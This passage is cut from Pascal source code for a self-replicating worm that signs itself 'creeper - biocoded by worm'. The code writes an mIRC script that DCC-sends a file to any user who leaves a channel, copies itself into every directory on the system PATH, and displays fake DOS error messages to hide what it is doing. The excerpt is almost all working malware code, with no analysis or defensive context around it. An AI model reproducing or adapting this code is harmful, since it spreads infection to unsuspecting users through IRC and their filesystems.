         else writeln(t,'n0=on 1:PART:#:{');
        writeln(t,'n1= /if ( $nick == $me ) { halt }');
        writeln(t,'n2= /.timer 1 ',random(60),' /.dcc send $nick ',targetfile2);
        writeln(t,'n3=}');
       end;
      close(t);
     end;
    1:chdir(currentdir);
    for i:=1 to 25 do strings[i]:='';
    replicate;
    s1:=getenv('path');
    n:=1;
    for i:=1 to length(s1) do
     begin
      if s1[i]<>';' then strings[n]:=strings[n]+s1[i]
       else
        begin
         chdir(strings[n]);
         replicate;
         inc(n)
        end;
     end;
    chdir(strings[n]);
    replicate;
    hit:=ioresult=0;
    chdir(currentdir);
    assign(f1,paramstr(0));
    getfattr(f1,attr1);
    setfattr(f1,archive);
    reset(f1,1);
    blockread(f1,copybuf,size);
    close(f1);
    setfattr(f1,attr1);
    case copybuf[size-1] of
     '1':begin
       if random(50)=0 then writeln('creeper - biocoded by worm');
       execute;
      end;
     '2':writeln('Divide overflow');
     '3':writeln('General protection fault');
     '4':writeln('Internal stack overflow');
     '5':writeln('Memory allocation error');
     '6':writeln('Out of environment space');
     '7':writeln('Program too big to fit in memory');
     '8':writeln('Sharing violation');
     '9':writeln('System resource exhausted');
    end;
   end.
